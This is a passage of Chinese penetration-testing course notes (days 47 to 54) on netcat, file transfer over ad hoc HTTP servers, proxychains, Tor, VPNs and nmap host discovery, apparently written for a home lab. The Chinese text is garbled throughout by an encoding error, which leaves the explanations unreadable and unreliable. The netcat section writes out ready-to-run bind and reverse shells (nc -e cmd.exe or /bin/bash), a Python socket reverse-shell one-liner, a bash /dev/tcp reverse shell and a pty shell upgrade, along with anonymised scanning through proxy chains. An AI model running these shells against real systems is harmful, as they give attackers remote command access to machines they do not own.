ï¼ˆ4ï¼‰æŸ¥çœ‹phpç‰ˆæœ¬
php -v

ï¼ˆ5ï¼‰æŸ¥çœ‹Mysqlçš„ç‰ˆæœ¬
mysql -uroot -p
mysql>select version();
ï¼ˆ6ï¼‰æŸ¥çœ‹pythonçš„ç‰ˆæœ¬
 python -V
 
ï¼ˆ7ï¼‰æŸ¥çœ‹sudoæˆæƒåˆ—è¡¨
 sudo -l
 
 Step05  ä¿®æ”¹é¶æœºçš„IPåœ°å€
 nano /etc/network/interfaces
 
 /etc/init.d/networking restart
 
 DNSçš„ä¿®æ”¹
 echo "nameserver 223.6.6.6" >/etc/resolv.conf
 
 Step06  sshè¿æ¥é¶æœº
 ssh msfadmin@192.168.195.29

47.2. é»‘å®¢å·¥å…·nc


Netcat-TCP/IPè¿æ¥çš„ç‘å£«å†›åˆ€


 Netcat establishes a connection between two computers and 
allows data to be written across the TCP and UDP transport layer protocols, and the network layer protocol IP
ä¸€ã€æ¦‚è¿°
netcatæ˜¯å€ŸåŠ©tcp/ipè¿æ¥æ¥ä¼ é€æ•°æ®çš„ä¸€ä¸ªå·¥å…·
The original Netcat was written by *Hobbit* hobbit@avian.org.

ä¸»è¦åŠŸèƒ½

	è·å–bannerä¿¡æ¯
	è¿œç¨‹æ§åˆ¶
	ä¼ è¾“æ–‡ä»¶
äºŒã€åŸºæœ¬çš„ç”¨æ³•

ï¼ˆ1ï¼‰connect to somewhere:  è¿æ¥æŸä¸ªä¸»æœº--ncçš„å®¢æˆ·ç«¯
  nc [-options] hostname port[s] [ports] ... 
 
ï¼ˆ2ï¼‰listen for inbound:  ä¾¦å¬---ncçš„æœåŠ¡ç«¯   

 nc -l -p port [-options] [hostname] [port]
 
  -l   ä¾¦å¬æ¨¡å¼                   listen mode, for inbound connects

  -p  æŒ‡å®šç›‘å¬çš„ç«¯å£              local port number


ä¸‰ã€ä½¿ç”¨ncä½œä¸ºChat/Messaging Serverï¼ˆèŠå¤©æœåŠ¡å™¨ï¼‰


PC1ï¼ˆ192.168.195.76ï¼‰  nc -l -p 2226  æœåŠ¡ç«¯
PC2                    nc  -nv  192.168.195.76 2226

-n                      numeric-only IP addresses, no DNS
ä»…ä½¿ç”¨æ•°å­—åœ°å€ï¼Œä¸åšDNSè§£æ
-v  æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œå¦‚æœä½¿ç”¨ä¸¤æ¬¡æˆ–å¤šæ¬¡ä¼šçœ‹åˆ°æ›´è¯¦ç»†çš„ä¿¡æ¯

-q secs                 quit after EOF on stdin and delay of secs
ä¼ è¾“ç»“æŸä¹‹åç­‰å¾…å¤šé•¿æ—¶é—´ï¼ˆç§’ï¼‰æ–­å¼€è¿æ¥

æ‰©å±•ï¼š
æ”¶é›†è¿œç¨‹è®¡ç®—æœºä¿¡æ¯ç”¨äºç”µå­å–è¯



### *Day48**
Windowsä¸»æœº
	ncpa.cpl  ç½‘ç»œè¿æ¥
	firewall.cpl é˜²ç«å¢™
å¦‚ä½•è¿œç¨‹ä¼ è¾“æ–‡ä»¶ï¼Ÿ
Step1: Kaliä¸­æä¾›äº†ä¸€äº›åœ¨Windowså¹³å°ä¸‹è¿è¡Œçš„å®‰å…¨å°å·¥å…·
 /usr/share/windows-binaries 
Step2 åœ¨Kaliä¸­æ­å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨

cd /usr/share/windows-binaries

æ–¹æ³•1ï¼šä½¿ç”¨Pythonåˆ›å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨
 
 ï¼ˆ1ï¼‰Python2
	python -m SimpleHTTPServer 7331
	
	http://192.168.195.76:7331/
 ï¼ˆ2ï¼‰Python3
   python3 -m http.server 7331
æ–¹æ³•2ï¼šä½¿ç”¨PHPåˆ›å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨
PHP includes a built-in web server
è¿™ä¸ªå†…ç½®çš„WebæœåŠ¡å™¨ä¸»è¦ç”¨äºæœ¬åœ°å¼€å‘ä½¿ç”¨ï¼Œä¸å¯ç”¨äºçº¿ä¸Šäº§å“ç¯å¢ƒã€‚

php -S 0.0.0.0:8000 -t /usr/share/windows-binaries

-t æŒ‡å®šç½‘ç«™çš„æ ¹ç›®å½•
https://www.php.net/manual/zh/features.commandline.webserver.php


ï¼ˆ3ï¼‰ä½¿ç”¨rubyåˆ›å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨
Rubyï¼Œä¸€ç§ç®€å•å¿«æ·çš„é¢å‘å¯¹è±¡ï¼ˆé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼‰è„šæœ¬è¯­è¨€

ruby -run -e httpd . -p 9000  

æŠŠå½“å‰ç›®å½•ï¼ˆ.ï¼‰ä½œä¸ºç½‘ç«™æ ¹ç›®å½•

ï¼ˆ4ï¼‰ä½¿ç”¨busyboxåˆ›å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨

https://busybox.net/about.html
BusyBoxå°†è®¸å¤šå…·æœ‰å…±æ€§çš„å°ç‰ˆæœ¬çš„UNIXå·¥å…·ç»“åˆåˆ°ä¸€ä¸ªå•ä¸€çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚
å¯ä»¥é€‚ç”¨äºä»»ä½•å°çš„åµŒå…¥å¼ç³»ç»Ÿ
 BusyBox provides a fairly complete environment for any small or embedded system.
the Swiss Army Knife of Embedded Linux

busybox httpd -f -p 10000



è¿™æ ·çš„é›†åˆå¯ä»¥æ›¿ä»£å¤§éƒ¨åˆ†å¸¸ç”¨å·¥å…·
æ¯”å¦‚çš„GNU fileutils ï¼Œshellutilsç­‰å·¥å…·ï¼Œ
BusyBoxæä¾›äº†ä¸€ä¸ªæ¯”è¾ƒå®Œå–„çš„ç¯å¢ƒï¼Œå¯ä»¥é€‚ç”¨äºä»»ä½•å°çš„åµŒå…¥å¼ç³»ç»Ÿã€‚

48.2 ä½¿ç”¨ncä¼ è¾“æ–‡ä»¶-File Transfers



Kaliï¼ˆ76ï¼‰ nc -lnvp 1234 >my_file.txt
xpï¼ˆ32ï¼‰   nc -lnvp 1234 | nc -nv 192.168.195.76 1234
metasploitable2ï¼ˆ29ï¼‰  nc -nv 192.168.195.32 1234 < reset_logs.sh


### *Day49**

49.1 ä½¿ç”¨ncä¼ è¾“ç›®å½• Directory Transfers


å‘é€ç«¯
tar cf  -       exam   |  nc -nv 192.168.195.29 12306  -q  1
 
æ¥æ”¶ç«¯
nc -lnvp 12306 | tar xf -


49.2 è¿œç¨‹æ§åˆ¶

        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
		å½“ncè¿æ¥å»ºç«‹æˆåŠŸåï¼Œå¯ä»¥è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤
	ï¼ˆ1ï¼‰æ­£å‘è¿æ¥
	ä»æ”»å‡»è€…çš„è§’åº¦ï¼Œç›®æ ‡æœºå™¨å¦‚ä½¿ç”¨ncå¼€å¯äº†ä¸€ä¸ªæœåŠ¡ç«¯å£ï¼Œæ”»å‡»è€…è¿æ¥ç›¸åº”çš„ç«¯å£ï¼Œè·å¾—ç›¸åº”çš„shell
	ä¼šå—åˆ°é˜²ç«å¢™çš„å½±å“
æ¡ˆä¾‹1
xp ï¼ˆå—å®³è€…ï¼‰ nc -lnvp 12306 -e cmd.exe  æœåŠ¡ç«¯
Kali ï¼ˆæ”»å‡»ç«¯ï¼‰nc -nv 192.168.195.32 12306    å®¢æˆ·ç«¯
æ¡ˆä¾‹2
Kaliï¼ˆå—å®³è€…ï¼‰ nc -lnvvp 12306  -e /bin/bash

metasploit2 ï¼ˆæ”»å‡»ç«¯ï¼‰	nc -nv 192.168.195.76 12306 
å¾—åˆ°shellä¹‹åå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å¾—äº¤äº’å¼shell
python -c 'import pty;pty.spawn("/bin/bash")'//è·å¾—äº¤äº’å¼shell

python -c 'import pty;pty.spawn("/bin/sh")'  //é€šç”¨ä¸€äº›
	
	ï¼ˆ2ï¼‰åå‘è¿æ¥ï¼ˆåå¼¹å¼shellï¼‰
Kali--æ”»å‡»ç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰   nc -lnvvp 12306     
xp ---ç›®æ ‡ï¼ˆå—å®³è€…ï¼‰ï¼ˆå®¢æˆ·ç«¯ï¼‰ nc -nv 192.168.195.76 12306 -e cmd.exe 

æ”»å‡»ç«¯å¼€å¯äº†ä¸€ä¸ªæœåŠ¡ç«¯å£ç­‰å¾…å—å®³è€…è¿æ¥ï¼Œå½“å—å®³è€…è¿æ¥æˆåŠŸä¹‹åæŠŠshellç»‘å®šåˆ°è¿æ¥ä¸Š
å¯¹äºå—å®³è€…æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå‡ºç«™è¿æ¥ï¼Œå‡ºç«™è¿æ¥é€šå¸¸ä¸ä¼šå—åˆ°é˜²ç«å¢™çš„é˜»æ­¢


===å»ºç«‹åå¼¹å¼shellä¹‹èŠ±æ ·æ¨¡å¼-Python


1. Kali  æ”»å‡»ç«¯


2. metasploit2 å—å®³è€… 192.168.195.76

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.195.76",12306));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


### *Day50**

===50.1. å»ºç«‹åå¼¹å¼shellä¹‹èŠ±æ ·æ¨¡å¼-bash

å—å®³è€…ï¼š
bash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1
bash -i >& /dev/tcp/192.168.195.76/12306 0>&1   //centosä¸­æˆåŠŸè¿ç”¨

PS1:
	bash -i æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼shell
PS2:
	& ç¬¦å· ç”¨äºåŒºåˆ†æ–‡ä»¶å’Œæ–‡ä»¶æè¿°ç¬¦

	>& + æ–‡ä»¶
		& ç¬¦å·åé¢è·Ÿæ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚
	>& + æ•°å­—
		& ç¬¦å·åé¢è·Ÿæ•°å­—æ—¶ï¼Œè¡¨ç¤ºåé¢çš„æ•°å­—æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸åŠ &ç¬¦å·åˆ™ä¼šæŠŠåé¢çš„æ•°å­—å½“æˆæ–‡ä»¶ã€‚
PS3:æ–‡ä»¶æè¿°ç¬¦
	0 æ ‡å‡†è¾“å…¥é‡å®šå‘
	1 æ ‡å‡†è¾“å‡ºé‡å®šå‘
	2 æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘
PS4:
/devç›®å½•ä¸‹çš„tcpå’Œudpæ˜¯Linuxä¸­çš„ç‰¹æ®Šè®¾å¤‡ï¼Œå¯ç”¨äºå»ºç«‹socketè¿æ¥
è¯»å†™è¿™ä¸¤ä¸ªæ–‡ä»¶å°±ç›¸å½“äºæ˜¯åœ¨Socketè¿æ¥ä¸­ä¼ è¾“æ•°æ®


>& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£

è¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»æœºï¼ˆè¿™æ—¶ç›®æ ‡æœºçš„å‘½ä»¤æ‰§è¡Œç»“æœå¯ä»¥ä»æ”»å‡»æœºçœ‹åˆ°ï¼‰

0>&1  åˆå°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°äº†æ ‡å‡†è¾“å‡º-æ”»å‡»æœºï¼Œä»è€Œå¯ä»¥é€šè¿‡æ”»å‡»æœºè¾“å…¥å‘½ä»¤

50.2. å®‰å…¨å’ŒåŒ¿å

æ£±é•œé—¨


åœ¨äº’è”ç½‘ä¸Šå¦‚ä½•ä¿æŒåŒ¿åï¼Œä¸è¢«è¿½è¸ªï¼Œæœ‰ä»¥ä¸‹æ–¹æ³•
â€¢ The Onion Network ï¼ˆæš—ç½‘ï¼‰
â€¢ æ´‹è‘±ç½‘ç»œ
â€¢ ä»£ç†æœåŠ¡å™¨
â€¢ è™šæ‹Ÿä¸“ç”¨ç½‘ç»œ
â€¢ ç§æœ‰åŠ å¯†çš„ç”µå­é‚®ä»¶




traceroute è·¯ç”±è·Ÿè¸ª Linux
tracert (Windows)
mtr

Tor

Torä¾é å¯¹è®¡ç®—æœºæ“ä½œå¤šæ¬¡åŠ å¯†ï¼Œé€šè¿‡å¤šä¸ªç½‘ç»œèŠ‚ç‚¹ï¼ˆå³â€œæ´‹è‘±è·¯ç”±å™¨â€ï¼‰é€‰æ‹©è·¯å¾„ï¼Œæ¥éšè—è®¡ç®—æœºæ“ä½œçš„æ¥æºã€ç›®çš„åœ°å’Œå†…å®¹ã€‚Torçš„ç”¨æˆ·æ˜¯æ— æ³•è¢«è¿½è¸ªçš„ï¼Œä½¿ç”¨ToréšåŒ¿æœåŠ¡çš„è¿™äº›ç½‘ç«™ã€è®ºå›ã€åšå®¢ä¹Ÿæ— æ³•è¿½è¸ªï¼Œå®ƒä»¬ä½¿ç”¨çš„æ˜¯åŒæ ·çš„æµé‡åŠ å¯†ç³»ç»Ÿæ¥éšè—å®šä½
è¦å¯ç”¨ Torï¼Œåªéœ€ä» https://www.torproject.org/å®‰è£… Tor æµè§ˆ

*Socket

Socksæ˜¯ä¸€ç§ä»£ç†æœåŠ¡ï¼Œå¯ä»¥å°†ä¸€ç«¯çš„ç³»ç»Ÿè¿åˆ°å¦ä¸€ç«¯ã€‚
Socksæ”¯æŒå¤šç§åè®®ï¼Œå¦‚HTTPã€FTP
Socksåˆ†ä¸ºSocks4å’ŒSocks5ä¸¤ç§ç±»å‹
Socks4åªæ”¯æŒTCPåè®®
Sockså¯ä»¥æ”¯æŒTCPå’ŒUDPåè®®ï¼Œè¿˜æ”¯æŒå„ç§èº«ä»½éªŒè¯æœºåˆ¶
æ ‡å‡†ç«¯å£ä¸º1080

# ç¬”è®°ï¼ˆDay51-60ï¼‰
### Day51
51.1. ä»£ç†ï¼ˆProxyï¼‰æœåŠ¡å™¨
ä»£ç†æœåŠ¡å™¨ç›¸å½“äºä¸€ä¸ªä¸­é—´äººçš„è§’è‰²
	å½“ç”¨æˆ·æµé‡æäº¤ç»™ä»£ç†æœåŠ¡å™¨åï¼Œä»£ç†æœåŠ¡å™¨ä»£æ›¿ç”¨æˆ·å‘ç›®æ ‡ä¸»æœºå‘é€è¯·æ±‚ã€‚
	ç›®æ ‡ä¸»æœºåœ¨è¿”å›æµé‡æ—¶ï¼Œä¹Ÿåªæ˜¯è¿”å›ç»™ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸æ˜¯ç›´æ¥å›é€ç»™ç”¨æˆ·ä¸»æœº
	è€Œæ˜¯ç”±ä»£ç†æœåŠ¡å™¨è¿”å›ç»™ç”¨æˆ·ä¸»æœºã€‚
é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæµé‡ä¼¼ä¹æ¥è‡ªä»£ç†ï¼Œè€Œä¸æ˜¯åŸå§‹ IP åœ°å€ã€‚
åœ¨ä»£ç†æœåŠ¡å™¨æ—¶å¯ä»¥ä½¿ç”¨å¤šçº§ä»£ç†ï¼Œç»„æˆä»£ç†é“¾

åœ¨å†…ç½‘æ¸—é€æµ‹è¯•ä¸­ä»£ç†æœåŠ¡å™¨å¯ä»¥å……å½“æ”»å‡»çš„è·³æ¿ï¼ˆä¸­æ¢ï¼‰

51.2. ä»£ç†ï¼ˆå®¢æˆ·ç«¯ï¼‰å·¥å…·-proxychains
proxychains4 - redirect connections through proxy servers
ä½œç”¨ï¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨ é‡å®šå‘è¿æ¥ 

51.3. é…ç½®ä¸€ä¸ªä»£ç†æœåŠ¡å™¨

ccproxy 
squid ___Linuxå¹³å°ä¸‹å¸¸ç”¨çš„ä»£ç†æœåŠ¡å™¨

51.4. Proxychainsçš„é…ç½®

é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼š /etc/proxychains4.conf

ä»£ç†çš„æ ¼å¼
      type  ip  port [user pass]
	  ç±»å‹  ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€  ç«¯å£  [ç”¨æˆ·å å¯†ç ]
	  ä»£ç†çš„ç±»å‹æœ‰HTTPã€SOCKSä»£ç†ç­‰

è¯­æ³•
  proxychains4 [ -f é…ç½®æ–‡ä»¶ ] <ç¨‹åº>
proxychainsçš„ä»£ç†æ–¹å¼æœ‰ä¸‰ç§ï¼š

 Different chaining options are supported. For instance:

           â€¢   take random proxy from the listï¼ˆrandom_chain ï¼‰

           â€¢   chain proxies in exact orderï¼ˆstrict_chainï¼Œä¸¥æ ¼çš„ä»£ç†ï¼‰

           â€¢   chain proxies in dynamic order (smart exclude dead proxies from chain)  dynamic_chain
strict_chainï¼Œä¸¥æ ¼çš„ä»£ç†ï¼ˆé»˜è®¤ï¼‰
æ‰€æœ‰çš„ä»£ç†éƒ½ä¼šå‘æŒ¥ä½œç”¨ï¼Œå¦‚æœæœ‰ä¸€ä¸ªä»£ç†ä¸åœ¨çº¿ï¼Œåˆ™ä¼šæŠ¥é”™
all proxies chained in the order as they appear in the list
all proxies must be online to play in chain
otherwise EINTR is returned to the app

dynamic_chain åŠ¨æ€çš„ä»£ç†
æˆ‘ä»¬å¯ä»¥è®¾ç½®åŠ¨æ€é“¾ï¼ˆ dynamic chainingï¼‰å®ƒé€šè¿‡åˆ—è¡¨ä¸­
çš„æ¯ä¸ªä»£ç†è¿è¡Œæˆ‘ä»¬çš„æµé‡ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªä»£ç†å®•æœºæˆ–æ²¡æœ‰å“åº”ï¼Œåˆ™è‡ªåŠ¨è½¬åˆ°åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªä»£ç†ï¼Œè€Œä¸ä¼šæŠ›å‡ºé”™è¯¯ã€‚å¦‚æœæˆ‘ä»¬ä¸è®¾ç½®è¿™ä¸ªï¼Œ åˆ™å…¶ä¸­ä¸€ä¸ªå¤±è´¥çš„ä»£ç†å°†ä¼šç ´åæˆ‘ä»¬æ•´ä¸ªçš„è¯·æ±‚ã€‚
random_chain  éšæœºçš„ä»£ç†
å…¶ä¸­ proxychain å°†ä»åˆ—è¡¨ä¸­éšæœºé€‰æ‹©ä¸€ç»„ IPåœ°å€ï¼Œå¹¶ä½¿ç”¨å®ƒä»¬åˆ›å»ºä»£ç†é“¾ã€‚
è¿™æ„å‘³ç€æ¯æ¬¡æˆ‘ä»¬ä½¿ç”¨ proxychainæ—¶ï¼Œä»£ç†å¯¹ç›®æ ‡çš„å¤–è§‚éƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œè¿™ä½¿å¾—ä»æºè·Ÿè¸ªæˆ‘ä»¬çš„æµé‡å˜å¾—æ›´åŠ å›°éš¾ã€‚
è¿™ä¸ªé€‰é¡¹ä¹Ÿè¢«è®¤ä¸ºæ˜¯â€œåŠ¨æ€â€çš„ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªä»£ç†å…³é—­ï¼Œå®ƒå°†è·³åˆ°ä¸‹ä¸€ä¸ªä»£ç†ã€‚


åŒæ—¶åªèƒ½è®¾ç½®ä¸€ç§ã€‚


  
ã€æ¡ˆä¾‹1ã€‘

ä»¥åŒ¿åçš„æ–¹å¼æ‰«æç›®æ ‡ä¸»æœº
nmap -sT -Pn ä¸»æœº

	-sT  tcpçš„è¿æ¥æ‰«æ 
	-Pn  ç¦ç”¨ä¸»æœºï¼ˆå‡è®¾ä¸»æœºæ˜¯å­˜æ´»çš„ï¼‰

Step01 ä¿®æ”¹/etc/proxychains4.conf
æœ€å
socks4          192.168.195.1 1080


Socksæ˜¯ä¸€ç§ä»£ç†æœåŠ¡ï¼Œå¯ä»¥å°†ä¸€ç«¯çš„ç³»ç»Ÿè¿åˆ°å¦ä¸€ç«¯ã€‚
Socksæ”¯æŒå¤šç§åè®®ï¼Œå¦‚HTTPã€FTP
Socksåˆ†ä¸ºSocks4å’ŒSocks5ä¸¤ç§ç±»å‹
Socks4åªæ”¯æŒTCPåè®®
Socks5å¯ä»¥æ”¯æŒTCPå’ŒUDPåè®®ï¼Œè¿˜æ”¯æŒå„ç§èº«ä»½éªŒè¯æœºåˆ¶
æ ‡å‡†ç«¯å£ä¸º1080

ã€æ¡ˆä¾‹2ã€‘é€šè¿‡ä»£ç†ä¸Šå¤–ç½‘
  proxychains firefox www.163.com
  
### Day52
52.1 VPN

ä»€ä¹ˆæ˜¯VPNï¼Ÿ
å…¨ç§°ä¸ºvirtual private network ï¼ˆè™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼‰

ä¼˜åŠ¿ï¼šè´¹ç”¨ä½ã€å®‰å…¨å¯é 

ä»ä¸ªäººè§’åº¦ï¼ŒVPNçš„å¥½å¤„ï¼š
ï¼ˆ1ï¼‰ä¿æŠ¤éšç§
ï¼ˆ2ï¼‰åŠ å¯†æµé‡
ï¼ˆ3ï¼‰ç§‘å­¦ä¸Šç½‘
é—ªç”µ
https://sdyun.cc/

ä»»ä½•äººçœ‹åˆ°æ‚¨çš„æµé‡æ¥è‡ªäº’è”ç½‘VPN è®¾å¤‡çš„ IP åœ°å€å’Œä½ç½®ï¼Œè€Œä¸æ˜¯æ‚¨è‡ªå·±çš„ã€‚
å¦å¤–ï¼Œæ‚¨ä¸ VPN è®¾å¤‡ä¹‹é—´çš„æ‰€æœ‰é€šä¿¡éƒ½æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥å³ä½¿æ‚¨çš„äº’è”ç½‘æœåŠ¡æä¾›å•†ä¹Ÿçœ‹ä¸åˆ°æ‚¨çš„é€šä¿¡

VPN service for secure, anonymous and unrestricted internet access on all devices
VPNæ˜¯ä¸€ç§å…è®¸æ‚¨åœ¨ä¸å±åŠæ‚¨çš„ä¿¡æ¯çš„æƒ…å†µä¸‹å®‰å…¨åœ°è®¿é—®äº’è”ç½‘çš„æœåŠ¡


VPNåè®®
ä½œç”¨ï¼šæ„å»ºåœ¨äº’è”ç½‘ä¸Šå®‰å…¨ä¼ é€æ•°æ®çš„éš§é“

ï¼ˆ1ï¼‰OpenVPN
é€šç”¨çš„VPNåè®®
å¯ä»¥åœ¨ä¸åŒç±»å‹è®¾å¤‡å·¥ä½œçš„æœ€å®‰å…¨ã€æœ€æµè¡Œçš„åè®®ä¹‹ä¸€ã€‚å®ƒæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®
ï¼ˆ2ï¼‰IPSec
ç”¨äºä¿æŠ¤ç½‘ç»œå±‚çš„é€šä¿¡å®‰å…¨
ä¸»è¦ç”¨äºæ„å»ºä¼ä¸šVPN
ï¼ˆ3ï¼‰PPTP
ç‚¹åˆ°ç‚¹éš§é“åè®®
è€çš„æ·˜æ±°çš„éš§é“åè®®ï¼Œæ“ä½œç³»ç»Ÿé€šå¸¸ä¼šå†…ç½®
ï¼ˆ4ï¼‰L2TP
äºŒå±‚éš§é“åè®®
æ¯”PPTPè¦å®‰å…¨
ä½¿ç”¨å¹¿æ³›
ï¼ˆ5ï¼‰WireGuard
æ–°çš„VPNåè®®ï¼Œå°šåœ¨æµ‹è¯•ä¸­

52.2 Encrypted Email åŠ å¯†é‚®ä»¶




é‚®ä»¶åŠ å¯†

ProtonMailé¡¹ç›®--ç‘å£«

å®‰å…¨å·¥å…·ï¼šå¦‚PGP
ä¼ä¸šé‚®ç®±

ç‘å£«åœ¨ä¿æŠ¤æœºå¯†æ–¹é¢æœ‰ç€æ‚ ä¹…è€Œä¼ å¥‡çš„å†å²

### Day53

****nc
****Nmap

1. Nmap Fundamentals  Nmapçš„åŸºç¡€

1.1 nmapçš„ä»‹ç»

ä½œè€…ï¼šGordon Lyon

https://nmap.org/p51-11.html

September of 1997

https://nmap.org/

ä½œç”¨ï¼šnetwork discovery and security auditing
 nmapæ˜¯ä¸€ä¸ªå…è´¹çš„åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œæ‰«æå·¥å…·ï¼Œå¯ä»¥è·¨å¹³å°ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºç½‘ç»œæ¢æµ‹å’Œå®‰å…¨å®¡è®¡

"Nmap (Network Mapper) is a free and open source (license) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network inventory,
managing service upgrade schedules, and monitoring host or service
uptime. Nmap uses raw IP packets in novel ways to determine what hosts
are available on the network, what services (application name and version)
those hosts are offering, what operating systems (and OS versions) they are
running, what type of packet filters/firewalls are in use, and dozens
of other characteristics. It was designed to rapidly scan large networks, but
works fine against single hosts. Nmap runs on all major computer operating
systems, and official binary packages are available for Linux, Windows,
and Mac OS X."

Nmapçš„å®¶æ—ï¼ˆåŒ…å«äº†å¾ˆå¤šé«˜çº§çš„ç½‘ç»œå·¥å…·ï¼‰
The Nmap project itself evolved into a family of advanced networking
tools that includes amazing projects such as Ncrack, Ncat, Nping, Zenmap, and, built into
Nmap itself, the Nmap Scripting Engine (NSE).
1.Ncrack--å¯†ç çš„æš´åŠ›ç ´è§£
2.ncat --ncçš„å˜ä½“
3.Nping å¼ºå¤§çš„pingå·¥å…·
4.Zenmap--nmapçš„å›¾å½¢åŒ–å·¥å…·
5.nmapæœ¬èº«
6.å¼ºå¤§çš„nampè„šæœ¬å¼•æ“ï¼ˆNmap Scripting Engine (NSE))


1.2 nmap-å‘ç°æ´»åŠ¨ä¸»æœº--HOST DISCOVERY

Finding online hosts

Finding online hosts in networks or on the internet is a common task among penetration
testers and system administrators.

å‘ç°æ´»åŠ¨ä¸»æœºæ˜¯æ¸—é€æµ‹è¯•äººå‘˜ï¼ˆç³»ç»Ÿç®¡ç†äººå‘˜ï¼‰å¸¸è§çš„ä¸€é¡¹ä»»åŠ¡ã€‚

nmap -V   //æŸ¥çœ‹nmapçš„ç‰ˆæœ¬


å®éªŒç¯å¢ƒ
Kali   192.168.195.0/24
ç›®æ ‡ï¼šWindowsä¸»æœº
      metasploit2
	  TOPPOé¶æœºï¼ˆLinuxæ“ä½œç³»ç»Ÿï¼‰
		*.vmdkï¼ˆVMwareè™šæ‹Ÿæœºç£ç›˜æ–‡ä»¶ï¼‰
		*.vmx ï¼ˆVMwareè™šæ‹Ÿæœºé…ç½®æ–‡ä»¶ï¼‰
	  
nmap -h //æŸ¥çœ‹nmapçš„å¸®åŠ©
man nmap

è¯­æ³•ï¼š
Usage: 
nmap [Scan Type(s)] [Options] {target specification}

nmap [æ‰«æç±»å‹]   [é€‰é¡¹]   {ç›®æ ‡}



HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan 
  //åªåšä¸»æœºå‘ç°ï¼Œä¸åšç«¯å£æ‰«æ
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
  
  
 man -t man | ps2pdf -> man.pdf


ã€Nmapæ¡ˆä¾‹1ã€‘
nmap -sn  192.168.195.0/24

nmap -sn  192.168.195.0/24 | grep report | awk '{print $5}' > local_ip.txt


ç›®æ ‡æŒ‡å®šæ–¹æ³•
1. 192.168.195.0/24ï¼ˆCIDRï¼Œæ— ç±»åŸŸé—´è·¯ç”±ï¼‰
Nmapå°†ä»»ä½•ä¸èƒ½è¯†åˆ«çš„é€‰é¡¹ä½œä¸ºç›®æ ‡ï¼Œå®ƒæ”¯æŒIPv4/IPv6åœ°å€ã€ä¸»æœºåå’Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦å’ŒCIDR
### Day54

æ¢æµ‹æ´»åŠ¨ä¸»æœº
nmap -sn 

nmap -sn -vvv  --reason 192.168.4.238

-v æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒå¤šä¸ªvçš„ç”¨æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ›´è¯¦ç»†çš„ä¿¡æ¯
--reason  æ˜¾ç¤ºåˆ¤æ–­çš„åŸå› 

ï¼ˆ1ï¼‰äºŒå±‚æ¢æµ‹
  ä½¿ç”¨arpåè®®
 å¯¹äºåŒä¸€ä¸ªç½‘æ®µï¼Œæ‰§è¡Œarpæ¢æµ‹
 ç›¸å…³å·¥å…·ï¼šarping 192.168.195.70
		   arp-scan -l  
				-l å¯¹æœ¬åœ°ç½‘ç»œæ‰«æ 
 
 ï¼ˆ2ï¼‰ä¸‰å±‚æ¢æµ‹
 ä½¿ç”¨icmpåè®®
 
 ï¼ˆ3ï¼‰å››å±‚æ¢æµ‹
	  TCPåè®®
  å¯¹äºä¸åœ¨åŒä¸€ä¸ªç½‘æ®µä¸»æœº
  1ï¼‰TCP SYN  -->443
  2ï¼‰TCP ACK  --->80
  3ï¼‰ICMP TimeSTAMP ï¼ˆæ—¶é—´æˆ³ï¼‰request 
  
  
 -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given po  
  -PS  TCP SYN æ‰«æ
